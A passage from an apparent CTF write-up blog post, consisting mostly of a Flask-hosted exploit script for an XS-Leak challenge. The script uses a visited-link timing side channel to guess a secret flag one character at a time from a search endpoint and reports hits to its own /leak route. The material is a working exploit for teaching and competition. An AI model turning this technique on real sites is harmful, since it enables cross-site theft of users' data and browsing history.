</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">249
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">250
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">251
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">252
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">253
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">254
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">255
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">256
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">257
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">258
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">259
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">260
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">261
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">262
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">from</span> flask <span style="color:#ff6ac1">import</span> Flask, render_template_string, request
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>app <span style="color:#ff6ac1">=</span> Flask(__name__)
</span></span><span style="display:flex;"><span>URL <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;http://127.0.0.1:21111/&#34;</span>
</span></span><span style="display:flex;"><span>CHARSET <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;1234567890&#34;</span> <span style="color:#78787e"># for local testing </span>
</span></span><span style="display:flex;"><span><span style="color:#78787e">#CHARSET = &#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#34;</span>
</span></span><span style="display:flex;"><span>ex_html <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;!DOCTYPE html&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;html lang=&#34;en&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;head&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    &lt;meta charset=&#34;UTF-8&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    &lt;title&gt;XS-Leak Test&lt;/title&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    &lt;style type=&#34;text/css&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        /* Set it up so the target link element has different colors when pointing to a
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">           visited vs unvisited URL. */
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        #target {
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            color: white;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            background-color: white;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            outline-color: white;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        }
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        #target:visited {
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            color: #feffff;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            background-color: #fffeff;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            outline-color: #fffffe;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        }
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    &lt;/style&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;/head&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;body&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;script&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    async function isVisited(url) {
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        let pocw = window.open(`/poc?url=${encodeURIComponent(url)}`, &#39;poc&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        pocw.focus();
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    }
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    // Extract the fragment identifier from the URL
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    let hash = window.location.hash.substring(1) || &#34;flag{g68r|a&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    let [guess, current_guess] = hash.split(&#39;|&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    let base_url = &#39;{{CHALLENGE_URL}}search?q=flag{&#39;; //change based on flag format
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    let charset = &#39;{{ CHARSET }}&#39;.split(&#39;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    async function exploit(current_guess) {
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        let w = open(`$</span><span style="color:#5af78e">{base_url}</span><span style="color:#5af78e">$</span><span style="color:#5af78e">{guess}</span><span style="color:#5af78e">$</span><span style="color:#5af78e">{current_guess}</span><span style="color:#5af78e">`, &#39;guess&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        await new Promise((resolve) =&gt; setTimeout(resolve, 1000));
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        w.close();
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        isVisited(`$</span><span style="color:#5af78e">{base_url}</span><span style="color:#5af78e">$</span><span style="color:#5af78e">{guess}</span><span style="color:#5af78e">$</span><span style="color:#5af78e">{current_guess}</span><span style="color:#5af78e">`);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    }
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    exploit(current_guess);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;/script&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;/body&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;/html&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>poc_html <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;!doctype html&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;html lang=&#34;en&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;head&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    &lt;meta charset=&#34;utf-8&#34;/&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    &lt;style type=&#34;text/css&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        #target {
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            color: white;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            background-color: white;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            outline-color: white;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        }
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        #target:visited {
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            color: #feffff;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            background-color: #fffeff;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            outline-color: #fffffe;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        }
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    &lt;/style&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;/head&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;body&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    &lt;div id=&#34;entryDisplay&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        Enter a URL to test for visited status:
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        &lt;input id=&#34;urlInput&#34; type=&#34;text&#34; size=&#34;60&#34; value=&#34;{{ url }}&#34; autofocus/&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        &lt;button id=&#34;testButton&#34;&gt;Test&lt;/button&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    &lt;script type=&#34;text/javascript&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        (function () {
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var entryDisplay = document.getElementById(&#39;entryDisplay&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var urlInput = document.getElementById(&#39;urlInput&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var testButton = document.getElementById(&#39;testButton&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var basisUrl;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var controlUrl;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var experimentUrl;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var targetLink;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var controlTickCount;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            function generateUnvisitedUrl () {
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                return &#39;https://&#39; + Math.random() + &#39;/&#39; + Date.now();
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            }
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            testButton.addEventListener(&#39;click&#39;, function () {
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                basisUrl = generateUnvisitedUrl();
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                controlUrl = generateUnvisitedUrl();
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                experimentUrl = urlInput.value;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                console.log({ experimentUrl })
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                entryDisplay.remove();
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                document.body.style.overflow = &#39;hidden&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink = document.createElement(&#39;a&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink.id = &#39;target&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink.href = basisUrl;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                var garbageText = &#39;æ¥­é›²å¤šå—ç‰‡ä¸»...&#39;.repeat(28);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink.appendChild(document.createTextNode(garbageText));
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink.style.display = &#39;block&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink.style.width = &#39;5px&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink.style.fontSize = &#39;2px&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink.style.outlineWidth = &#39;24px&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink.style.textAlign = &#39;center&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink.style.filter =
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    &#39;contrast(200%) drop-shadow(16px 16px 10px #fefefe) saturate(200%)&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink.style.textShadow = &#39;16px 16px 10px #fefffe&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink.style.transform = &#39;perspective(100px) rotateY(37deg)&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                document.body.appendChild(targetLink);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                requestAnimationFrame(function () {
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    requestAnimationFrame(function () {
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        runTestStage(false);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    });
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                });
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            });
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            function runTestStage (isExperimentStage) {
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                var testUrl = isExperimentStage ? experimentUrl : controlUrl;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                startCountingTicks();
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                startOscillatingHref(testUrl);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                setTimeout(async function () {
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    stopOscillatingHref();
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    if (!isExperimentStage) {
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        controlTickCount = stopCountingTicks();
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        runTestStage(true);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        return;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    var experimentTickCount = stopCountingTicks();
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    targetLink.remove();
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    var ratio = experimentTickCount / controlTickCount;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    console.log(&#34;RATIO&#34;, experimentTickCount, controlTickCount, ratio)
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    var likelyVisited = ratio &lt; 0.7;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                   
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    async function sendBeacon(cond){
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        let url = opener ? opener.location.hash.substring(1) : &#34;flag{g68r|a&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        let [guess, current_guess] = url.split(&#39;|&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        if(cond){
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                            await fetch(`/leak?flag=$</span><span style="color:#5af78e">{guess}</span><span style="color:#5af78e">$</span><span style="color:#5af78e">{current_guess}</span><span style="color:#5af78e">`);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                            if (opener) {
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                                opener.location.href = `/?query=${Math.random()}&amp;ratio=$</span><span style="color:#5af78e">{ratio}</span><span style="color:#5af78e">#$</span><span style="color:#5af78e">{guess}</span><span style="color:#5af78e">$</span><span style="color:#5af78e">{current_guess}</span><span style="color:#5af78e">|a`;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                            }
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        else {
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                            let charset = &#39;{{ CHARSET }}&#39;.split(&#39;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                            if (opener) {
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                                opener.location.href = `/?query=${Math.random()}&amp;ratio=$</span><span style="color:#5af78e">{ratio}</span><span style="color:#5af78e">#$</span><span style="color:#5af78e">{guess}</span><span style="color:#5af78e">|$</span><span style="color:#5af78e">{charset[charset.indexOf(current_guess)+1]}</span><span style="color:#5af78e">`;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                            }
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    sendBeacon(likelyVisited);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    document.body.style.overflow = &#39;visible&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    var outputDom = document.createElement(&#39;p&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    outputDom.appendChild(document.createTextNode(&#39;Result for &#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    var linkDom = document.createElement(&#39;a&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    linkDom.href = experimentUrl;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    linkDom.appendChild(document.createTextNode(experimentUrl));
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    outputDom.appendChild(linkDom);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    outputDom.appendChild(document.createTextNode(&#39;: likely &#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    var resultDom = document.createElement(&#39;strong&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    resultDom.innerHTML = likelyVisited ? &#39;VISITED&#39; : &#39;UNVISITED&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    resultDom.style.color = likelyVisited ? &#39;green&#39; : &#39;red&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    outputDom.appendChild(resultDom);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    outputDom.appendChild(document.createTextNode(
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        &#39; (&#39; + experimentTickCount + &#39; ticks vs &#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        controlTickCount + &#39; ticks; ratio = &#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        Math.round(ratio * 100) + &#39;%).&#39;));
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    document.body.appendChild(outputDom);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    var retryButton = document.createElement(&#39;button&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    retryButton.innerHTML = &#39;Try Another URL&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    retryButton.addEventListener(&#39;click&#39;, function (e) {
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                        location.reload();
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    });
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    document.body.appendChild(retryButton);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    retryButton.focus();
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                }, 500);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            } 
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var oscillateInterval;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var isPointingToBasisUrl = true;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            function startOscillatingHref (testUrl) {
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                oscillateInterval = setInterval(function () {
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    targetLink.href = isPointingToBasisUrl ? testUrl : basisUrl;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    isPointingToBasisUrl = !isPointingToBasisUrl;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                }, 0);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            }
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            function stopOscillatingHref () {
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                clearInterval(oscillateInterval);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                targetLink.href = basisUrl;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                isPointingToBasisUrl = true;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            }
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var tickCount = 0;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var tickRequestId;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            function startCountingTicks () {
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                tickRequestId = requestAnimationFrame(function () {
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    ++tickCount;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                    startCountingTicks();
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                });
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            }
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            function stopCountingTicks () {
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                cancelAnimationFrame(tickRequestId);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                var oldTickCount = tickCount;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                tickCount = 0;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">                return oldTickCount;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            }
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        })();
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        setTimeout(function () {
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            var testButton = document.getElementById(&#39;testButton&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">            testButton.click();
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">        }, 1000);
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">   
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">    &lt;/script&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;/body&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&lt;/html&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff9f43">@app.route</span>(<span style="color:#5af78e">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">index</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> render_template_string(ex_html, CHALLENGE_URL<span style="color:#ff6ac1">=</span>URL,CHARSET<span style="color:#ff6ac1">=</span>CHARSET)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff9f43">@app.route</span>(<span style="color:#5af78e">&#39;/poc&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">poc</span>():
</span></span><span style="display:flex;"><span>    args <span style="color:#ff6ac1">=</span> request<span style="color:#ff6ac1">.</span>args<span style="color:#ff6ac1">.</span>get(<span style="color:#5af78e">&#39;url&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> render_template_string(poc_html, url<span style="color:#ff6ac1">=</span>args, CHALLENGE_URL<span style="color:#ff6ac1">=</span>URL,CHARSET<span style="color:#ff6ac1">=</span>CHARSET)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff9f43">@app.route</span>(<span style="color:#5af78e">&#39;/leak&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">leak</span>():
</span></span><span style="display:flex;"><span>    flag <span style="color:#ff6ac1">=</span> request<span style="color:#ff6ac1">.</span>args<span style="color:#ff6ac1">.</span>get(<span style="color:#5af78e">&#39;flag&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> flag[<span style="color:#ff6ac1">-</span><span style="color:#ff9f43">1</span>] <span style="color:#ff6ac1">==</span> <span style="color:#5af78e">&#39;}&#39;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">print</span>(flag)
</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> <span style="color:#5af78e">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span> __name__ <span style="color:#ff6ac1">==</span> <span style="color:#5af78e">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    app<span style="color:#ff6ac1">.</span>run(host<span style="color:#ff6ac1">=</span><span style="color:#5af78e">&#39;0.0.0.0&#39;</span>,port<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">1337</span>)
</span></span></code></pre></td></tr></table>
</div>
</div>

        
          <div class="blog-tags">
            
              <a href="https://Alfinj0se.github.io//tags/writeups/">writeups</a>&nbsp;
            
          </div>
        

        

        
          
            
          

          
                  <h4 class="see-also">See also</h4>
                  <ul>
                
                
                    <li><a href="/posts/intigritixssaug2024/">Intigriti 0824 XSS Challenge</a></li>
                
                    <li><a href="/posts/intigritixssjuly2024/">Intigriti 0724 XSS Challenge</a></li>
                
                    <li><a href="/posts/kitctf2024/">Flag Remover - KitCTF 2024</a></li>
                
                    <li><a href="/posts/mochactf-2024/">Mocha CTF 2024 Web Writeups</a></li>
                
                    <li><a href="/posts/paaad-hackluctf2023/">pÃ¤Ã¤Ã¤d - Hack.lu CTF 2023 </a></li>
                
              </ul>

          
        
      </article>

      
        <ul class="pager blog-pager">
          
            <li class="previous">
              <a href="https://Alfinj0se.github.io/posts/paaad-hackluctf2023/" data-toggle="tooltip" data-placement="top" title="pÃ¤Ã¤Ã¤d - Hack.lu CTF 2023 ">&larr; Previous Post</a>
            </li>
          
          
            <li class="next">
              <a href="https://Alfinj0se.github.io/posts/mochactf-2024/" data-toggle="tooltip" data-placement="top" title="Mocha CTF 2024 Web Writeups">Next Post &rarr;</a>
            </li>
          
        </ul>
      


      

    </div>
  </div>
</div>

      
<footer>
  <div class="container">
    
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center footer-links">
          
              <li>
		
		  <a href="https://github.com/AlfinJ0se/" title="GitHub">
		
                  <span class="fa-stack fa-lg">
                    <i class="fas fa-circle fa-stack-2x"></i>
                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
              <li>
		
		  <a href="https://twitter.com/Alfinjoseph19" title="Twitter">
		
                  <span class="fa-stack fa-lg">
                    <i class="fas fa-circle fa-stack-2x"></i>
                    <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
              <li>
		
